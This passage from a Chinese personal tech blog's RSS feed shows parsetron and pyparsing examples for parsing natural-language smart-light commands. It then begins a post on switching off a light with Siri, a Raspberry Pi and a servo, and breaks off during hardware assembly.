    &lt;span class="n"&gt;color&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Regex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;(red|yellow|blue|orange|purple|...)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;times&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;once&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;twice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;three times&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;Regex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;\d+ times&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;one_parse&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;light&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Optional&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;times&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;color&lt;/span&gt;
    &lt;span class="n"&gt;GOAL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;OneOrMore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;one_parse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RobustParser&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;LightGrammar&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
        &lt;span class="n"&gt;sents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;set my top light to red&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;set my top light to red and change middle light to yellow&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;set my top light to red and change middle light to yellow and flash bottom light twice in blue&amp;quot;&lt;/span&gt;
        &lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;sent&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sents&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;one_parse&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;color&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;red&amp;#39;&lt;/span&gt;

            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;sent&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;parse tree:&amp;quot;&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;parse result:&amp;quot;&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行&lt;code&gt;LightGrammar.test()&lt;/code&gt;得到：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;set my top light to red&amp;quot;
parse tree:
(GOAL
  (one_parse
    (action &amp;quot;set&amp;quot;)
    (light &amp;quot;top&amp;quot;)
    (color &amp;quot;red&amp;quot;)
  )
)

parse result:
{
  &amp;quot;one_parse&amp;quot;: [
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;set&amp;quot;,
        &amp;quot;top&amp;quot;,
        &amp;quot;red&amp;quot;
      ],
      &amp;quot;light_span_&amp;quot;: [
        2,
        3
      ],
      &amp;quot;action_span_&amp;quot;: [
        0,
        1
      ],
      &amp;quot;light&amp;quot;: &amp;quot;top&amp;quot;,
      &amp;quot;color_span_&amp;quot;: [
        5,
        6
      ],
      &amp;quot;color&amp;quot;: &amp;quot;red&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;set&amp;quot;,
      &amp;quot;one_parse_span_&amp;quot;: [
        0,
        6
      ]
    }
  ],
  &amp;quot;GOAL&amp;quot;: [
    [
      &amp;quot;set&amp;quot;,
      &amp;quot;top&amp;quot;,
      &amp;quot;red&amp;quot;
    ]
  ]
}

&amp;quot;set my top light to red and change middle light to yellow&amp;quot;
parse tree:
(GOAL
  (one_parse
    (action &amp;quot;set&amp;quot;)
    (light &amp;quot;top&amp;quot;)
    (color &amp;quot;red&amp;quot;)
  )
  (one_parse
    (action &amp;quot;change&amp;quot;)
    (light &amp;quot;middle&amp;quot;)
    (color &amp;quot;yellow&amp;quot;)
  )
)

parse result:
{
  &amp;quot;one_parse&amp;quot;: [
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;set&amp;quot;,
        &amp;quot;top&amp;quot;,
        &amp;quot;red&amp;quot;
      ],
      &amp;quot;light_span_&amp;quot;: [
        2,
        3
      ],
      &amp;quot;action_span_&amp;quot;: [
        0,
        1
      ],
      &amp;quot;light&amp;quot;: &amp;quot;top&amp;quot;,
      &amp;quot;color_span_&amp;quot;: [
        5,
        6
      ],
      &amp;quot;color&amp;quot;: &amp;quot;red&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;set&amp;quot;,
      &amp;quot;one_parse_span_&amp;quot;: [
        0,
        6
      ]
    },
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;change&amp;quot;,
        &amp;quot;middle&amp;quot;,
        &amp;quot;yellow&amp;quot;
      ],
      &amp;quot;light_span_&amp;quot;: [
        8,
        9
      ],
      &amp;quot;action_span_&amp;quot;: [
        7,
        8
      ],
      &amp;quot;light&amp;quot;: &amp;quot;middle&amp;quot;,
      &amp;quot;color_span_&amp;quot;: [
        11,
        12
      ],
      &amp;quot;color&amp;quot;: &amp;quot;yellow&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;change&amp;quot;,
      &amp;quot;one_parse_span_&amp;quot;: [
        7,
        12
      ]
    }
  ],
  &amp;quot;GOAL&amp;quot;: [
    [
      &amp;quot;set&amp;quot;,
      &amp;quot;top&amp;quot;,
      &amp;quot;red&amp;quot;
    ],
    [
      &amp;quot;change&amp;quot;,
      &amp;quot;middle&amp;quot;,
      &amp;quot;yellow&amp;quot;
    ]
  ]
}

&amp;quot;set my top light to red and change middle light to yellow and flash bottom light twice in blue&amp;quot;
parse tree:
(GOAL
  (one_parse
    (action &amp;quot;set&amp;quot;)
    (light &amp;quot;top&amp;quot;)
    (color &amp;quot;red&amp;quot;)
  )
  (one_parse
    (action &amp;quot;change&amp;quot;)
    (light &amp;quot;middle&amp;quot;)
    (color &amp;quot;yellow&amp;quot;)
  )
  (one_parse
    (action &amp;quot;flash&amp;quot;)
    (light &amp;quot;bottom&amp;quot;)
    (Optional(times)
      (times
        (Set(three times|twice|once) &amp;quot;twice&amp;quot;)
      )
    )
    (color &amp;quot;blue&amp;quot;)
  )
)

parse result:
{
  &amp;quot;one_parse&amp;quot;: [
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;set&amp;quot;,
        &amp;quot;top&amp;quot;,
        &amp;quot;red&amp;quot;
      ],
      &amp;quot;light_span_&amp;quot;: [
        2,
        3
      ],
      &amp;quot;action_span_&amp;quot;: [
        0,
        1
      ],
      &amp;quot;light&amp;quot;: &amp;quot;top&amp;quot;,
      &amp;quot;color_span_&amp;quot;: [
        5,
        6
      ],
      &amp;quot;color&amp;quot;: &amp;quot;red&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;set&amp;quot;,
      &amp;quot;one_parse_span_&amp;quot;: [
        0,
        6
      ]
    },
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;change&amp;quot;,
        &amp;quot;middle&amp;quot;,
        &amp;quot;yellow&amp;quot;
      ],
      &amp;quot;light_span_&amp;quot;: [
        8,
        9
      ],
      &amp;quot;action_span_&amp;quot;: [
        7,
        8
      ],
      &amp;quot;light&amp;quot;: &amp;quot;middle&amp;quot;,
      &amp;quot;color_span_&amp;quot;: [
        11,
        12
      ],
      &amp;quot;color&amp;quot;: &amp;quot;yellow&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;change&amp;quot;,
      &amp;quot;one_parse_span_&amp;quot;: [
        7,
        12
      ]
    },
    {
      &amp;quot;one_parse&amp;quot;: [
        &amp;quot;flash&amp;quot;,
        &amp;quot;bottom&amp;quot;,
        &amp;quot;twice&amp;quot;,
        &amp;quot;blue&amp;quot;
      ],
      &amp;quot;color_span_&amp;quot;: [
        18,
        19
      ],
      &amp;quot;light_span_&amp;quot;: [
        14,
        15
      ],
      &amp;quot;action_span_&amp;quot;: [
        13,
        14
      ],
      &amp;quot;light&amp;quot;: &amp;quot;bottom&amp;quot;,
      &amp;quot;Optional(times)&amp;quot;: &amp;quot;twice&amp;quot;,
      &amp;quot;times&amp;quot;: &amp;quot;twice&amp;quot;,
      &amp;quot;Optional(times)_span_&amp;quot;: [
        16,
        17
      ],
      &amp;quot;times_span_&amp;quot;: [
        16,
        17
      ],
      &amp;quot;Set(three times|twice|once)&amp;quot;: &amp;quot;twice&amp;quot;,
      &amp;quot;action&amp;quot;: &amp;quot;flash&amp;quot;,
      &amp;quot;Set(three times|twice|once)_span_&amp;quot;: [
        16,
        17
      ],
      &amp;quot;one_parse_span_&amp;quot;: [
        13,
        19
      ],
      &amp;quot;color&amp;quot;: &amp;quot;blue&amp;quot;
    }
  ],
  &amp;quot;GOAL&amp;quot;: [
    [
      &amp;quot;set&amp;quot;,
      &amp;quot;top&amp;quot;,
      &amp;quot;red&amp;quot;
    ],
    [
      &amp;quot;change&amp;quot;,
      &amp;quot;middle&amp;quot;,
      &amp;quot;yellow&amp;quot;
    ],
    [
      &amp;quot;flash&amp;quot;,
      &amp;quot;bottom&amp;quot;,
      &amp;quot;twice&amp;quot;,
      &amp;quot;blue&amp;quot;
    ]
  ]
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;非常漂亮！&lt;/p&gt;
&lt;p&gt;更完整的例子可以参考 &lt;a href="http://parsetron.kitt.ai/en/latest/quickstart.html#complex-example"&gt;Complex Example&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;It is mainly used to convert natural language command to executable API calls (e.g., “set my bedroom light to red” –&amp;gt; set_light('bedroom', [255, 0, 0]))&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;parsetron的典型使用场景是将自然语言转变为api调用，实际是将非结构话的自然语言，解析为结构化的数据，进而调用api。&lt;/p&gt;
&lt;p&gt;作者给出了一些&lt;a href="http://parsetron.kitt.ai/en/latest/quickstart.html#what-it-is"&gt;典型使用场景&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;诸如使用自然语言控制你的智能灯泡：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;give me something romantic&lt;/li&gt;
&lt;li&gt;my living room light is too dark&lt;/li&gt;
&lt;li&gt;change bedroom light to sky blue&lt;/li&gt;
&lt;li&gt;blink living room light twice in red color&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以及控制你的微波炉：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;defrost this chicken please, the weight is 4 pounds&lt;/li&gt;
&lt;li&gt;heat up the pizza for 2 minutes 20 seconds&lt;/li&gt;
&lt;li&gt;warm up the milk for 1 minute&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者给出了这类需求的通用解决方案：从自然语言命令中提取关键信息，以帮助开发人员调用API来控制智能设备。由此完成了自然语言指令到传统程序的映射&lt;/p&gt;
&lt;p&gt;作者进一步分析说传统的方法是编写一系列规则，如正则表达式，这些规则难以维护和扩展。而采用编译原理中的词法/语法解析。不但学习曲线很高，且解析器输出通常是树结构，对我们的任务没有直接的帮助&lt;/p&gt;
&lt;p&gt;我在&lt;a href="https://github.com/wwj718/deepThought"&gt;deepThought&lt;/a&gt;的目标里写过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;构造通用的解析工具，将自然语言解析为结构化信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这点与parsetron不谋而合，parsetron对我而言是作为bot server的理想实现，用于解析硬件指令&lt;/p&gt;
&lt;p&gt;其实目前Siri也具有这个功能（需要hack，而且比较繁琐），我在《嘿 Siri 关灯》主要就用到这个功能。&lt;/p&gt;
&lt;h3&gt;问题&lt;/h3&gt;
&lt;p&gt;parsetron暂不支持中文，项目的todo中有支持unicode的计划，不过项目一年来似乎没更新了，我fork了这个项目，近期试着为它增加中文支持&lt;/p&gt;
&lt;h1&gt;Pyparsing&lt;/h1&gt;
&lt;p&gt;Parsetron的文档里写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Parsetron is inspired by pyparsing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们顺路了解一下&lt;a href="https://pyparsing.wikispaces.com/"&gt;pyparsing&lt;/a&gt;，顾名思义，Pyparsing是python实现的解析器。&lt;/p&gt;
&lt;h3&gt;入门&lt;/h3&gt;
&lt;p&gt;简单做个入门了解。以解析"Hello, World!"为例&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pyparsing&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Word&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;alphas&lt;/span&gt;
&lt;span class="n"&gt;greet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Word&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;alphas&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Word&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;alphas&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;!&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;-- grammar defined here&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello, World!&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;greet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parseString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt; &lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输出为：&lt;code&gt;Hello, World! -&amp;gt; ['Hello', ',', 'World', '!']&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;上边的greet可以解析任何具有以下模式的句子： &lt;code&gt;&amp;lt;salutation&amp;gt;, &amp;lt;addressee&amp;gt;!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;更多案例和使用方法参考:&lt;a href="https://pyparsing.wikispaces.com/Examples"&gt;Examples&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;支持中文&lt;/h3&gt;
&lt;p&gt;值得一提的是pyparsing支持python3和unicode，这对我们处理中文会有大帮助。我们来做个试验：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python3&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pyparsing&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Word&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;alphas&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;CharsNotIn&lt;/span&gt;
&lt;span class="n"&gt;greet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharsNotIn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,!&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;,&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CharsNotIn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,!&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;!&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;-- grammar defined here&lt;/span&gt;
&lt;span class="n"&gt;hello&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;你好, 世界!&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;greet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parseString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;hello&lt;/span&gt; &lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输出为 ： &lt;code&gt;好, 世界! -&amp;gt; ['你好', ',', ' 世界', '!']&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个解决方案可行，但比较丑陋，如何在pyparsing使用unicode，可以自行google&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 26 Dec 2016 00:00:00 +0000</pubDate><guid>tag:,2016-12-26:openbot-natural-language-parser.html</guid><category>tools</category></item><item><title>嘿 Siri 关灯</title><link>/rpi-siri-close-light.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri17469bd4.png" /&gt;&lt;/p&gt;
&lt;h1&gt;引言&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;你在南方的艳阳里大雪纷飞,我在北方的寒夜里四季如春&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;马頔的这句歌词，道尽南方人过冬的艰辛。在没有暖气的南方，过冬基本靠抖腿和一身正气&lt;/p&gt;
&lt;p&gt;我们以高中诗词鉴赏的套路来剖析下词作，"你在南方的艳阳里大雪纷飞"当然不是直白地描述一场太阳雪,艺术要有含蓄美。这句话实际上说的是"你"在灯如暖阳的房间里，忘穿秋裤，冻得像雪地里呆呆的兔子（由此可见这个灯是白炽灯而不是节能灯，节能灯如白月光而不似暖阳）&lt;/p&gt;
&lt;p&gt;如果你有兴趣深挖，会进一步坚定艳阳指的就是灯。小如洞穴的房间、灯与影子，不由让人想到柏拉图的洞穴理论，作者进而感慨现实世界的不真实性，于是有后边的"穷极一生做不完一场梦"&lt;/p&gt;
&lt;p&gt;至于如果题目问"你"指的是谁，你最好不要答前女友，其他随意，以免勾起阅卷老师伤感的回忆，给你个悲伤的分数&lt;/p&gt;
&lt;p&gt;在灯如暖阳床如霜的南方夜晚，你刚看完《汇编语言从入门到放弃》，准备起床关灯睡觉，却对被子依依不舍。这时你想：要是对着Siri说一声&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;嘿siri，宝宝困了帮我关灯么么哒&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;便可睡觉该是多美的场景&lt;/p&gt;
&lt;p&gt;又或者 圣诞夜你和你的小女朋友在被窝里讨论拉普拉斯变换或是傅里叶变换，可窗帘没拉，灯太亮影响发挥。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;嘿Siri关灯并闭上眼睛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;让我们撸起袖子来实现它&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;我不建议你给房间换一个智能灯泡，也不打算向你推销一套年底特价智能家居解决方案，我们延续之前的思路(&lt;a href="http://blog.just4fun.site/raspberrypi-lirc.html"&gt;用树莓派给家用电器加上智能&lt;/a&gt;)，尽量用非入侵的方式来解决问题，不去破坏和替换现有的设备&lt;/p&gt;
&lt;p&gt;于是我们就提出这样一个问题：如何在不改变现有灯泡特性、电路结构和开关特性的情况下，来关灯？&lt;/p&gt;
&lt;p&gt;能想到的方案似乎只有模拟人手的动作，以机械的方式来按下开关&lt;/p&gt;
&lt;p&gt;"舵机"就是我们的首选了&lt;/p&gt;
&lt;p&gt;剩下的就是如何躺在床上控制舵机来关灯，与硬件世界打交道，树莓派是我偏好的工具。树莓派控制舵机不成问题，至于如何用手机控制树莓派，我也在此前的文章中论述过&lt;/p&gt;
&lt;p&gt;不过本文将采用更酷的方式，你将无需编程，通过拖曳积木化的模块，就可以搭建出关灯机器人，然后通过siri控制这个机器人,如此一来你可以用自然语言的方式给siri发送关灯命令&lt;/p&gt;
&lt;p&gt;这个方案拓展开，我们几乎可以控制所有的按键式开关&lt;/p&gt;
&lt;p&gt;自然语言处理这部分Siri帮我们做了，之后有机会我们自己来实现，听起来有点像最近怒刷各种技术社区的&lt;a href="https://m.toutiao.com/i6366879371965235714/?tt_from=weixin_moments&amp;amp;utm_campaign=client_share&amp;amp;app=news_article&amp;amp;utm_source=weixin_moments&amp;amp;iid=6814510930&amp;amp;utm_medium=toutiao_android&amp;amp;wxshare_count=2&amp;amp;pbid=31547628651&amp;amp;from=timeline&amp;amp;isappinstalled=0"&gt;Jarvis&lt;/a&gt; --扎尔伯格用人工智能控制家居的项目&lt;/p&gt;
&lt;h1&gt;准备工作&lt;/h1&gt;
&lt;h3&gt;硬件部分&lt;/h3&gt;
&lt;p&gt;硬件部分包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;树莓派&lt;/li&gt;
&lt;li&gt;舵机&lt;/li&gt;
&lt;li&gt;长导线&lt;/li&gt;
&lt;li&gt;移动电源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri56e654b0.png" /&gt;&lt;/p&gt;
&lt;p&gt;组件不多，考虑到电灯开关的位置一般齐胸，而树莓派和移动电源(供电)放在地上，所以你需要三根长导线，而不是普通的杜邦线，和往常一样，长导线这种东西都是从万能的@李老师的万能的实验室里要来的,感谢@李老师一直以来的助攻&lt;/p&gt;
&lt;p&gt;下边我们对各个部分做个简单介绍：&lt;/p&gt;
&lt;h4&gt;树莓派&lt;/h4&gt;
&lt;p&gt;关于树莓派，可以参考我此前的文章:&lt;a href="http://blog.just4fun.site/raspberrypi-install-and-config.html"&gt;树莓派折腾笔记之系统安装与配置&lt;/a&gt;.入门新手会遇到的问题我基本都列出了&lt;/p&gt;
&lt;p&gt;我也翻译了一份&lt;a href="https://github.com/wwj718/awesome-raspberry-pi-zh"&gt;树莓派(Raspberry Pi)资源大全中文版&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;供大家玩耍时参考&lt;/p&gt;
&lt;h4&gt;舵机&lt;/h4&gt;
&lt;p&gt;我买的是淘宝上的SG90 9g舵机，价格6块多,关于舵机的控制原理比较麻烦，李老师跟我描述过，我听个大概，不过不影响，去网上抄段程序修修改改，封装为黑盒函数基本能用，有空在细看这块&lt;/p&gt;
&lt;p&gt;简单介绍下舵机上的几根线:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;红色：电压&lt;/li&gt;
&lt;li&gt;粽色：地线&lt;/li&gt;
&lt;li&gt;橙色：信号线&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我把信号线接到18号引脚(BCM) ，查看gpio图：&lt;code&gt;gpio readall&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;李老师&lt;/h4&gt;
&lt;p&gt;顺便也介绍些李老师.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;李老师其实不是我的老师,我毕业后才认识他，我从李老师这边学到很多硬件知识，从传道解惑的角度来说，李老师确是我的老师&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;李老师南大博士毕业后，在大学指教，他博士阶段读的是图像识别，但他是个彻头彻尾的硬件黑客&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;李老师的实验室黑科技齐全，哆啦A梦口袋一般，有求必应&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;李老师常说的话有这样一种模式："没事没事，xx功能的电子设备买不到也没事，我们自己画，等印刷完，你过来取". 我们有个有趣的项目，硬件部分都是李老师画的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;迄今 只有一次例外 有一回李老师在论述分布式节点的连接策略时，我突然想要一个无线开关来控制我那不够智能的油汀，以便于用树莓派控制它。李老师和往常一样，在讨论中突然想到和论题相关的其他问题:这回是关于如何把无线模块画得更小，当他兴致勃勃地准备分享这个思路时，我不合时宜地提出想要一个无线开关，能不能用继电器 开关外壳和无线模块，外加画个板子集成它们，李老师以一种给你糖吃别说话的样子，说这个淘宝上有卖的，app都带了，你去买一个，抓包hack它就能编程了。于是李老师继续谈论他画板子的布线方案&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;李老师实验室的四轴飞行器，除了飞行器是自己做的，遥控手柄也是自己画的&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大家感受一下&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/lilaoshi397d1e4f.png" /&gt;&lt;/p&gt;
&lt;p&gt;让我们想到那句感人的话&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;情之所钟，虽丑不嫌&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;感觉哪里不对 ……&lt;/p&gt;
&lt;h3&gt;组装硬件&lt;/h3&gt;
&lt;p&gt;硬件部分的组装很容易，直接上效果图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri4cc6a938.png" /&gt;&lt;/p&gt;
&lt;p&gt;接下来让我们用双面胶把舵机贴到开关边上，舵机转动即可关灯&lt;/p&gt;
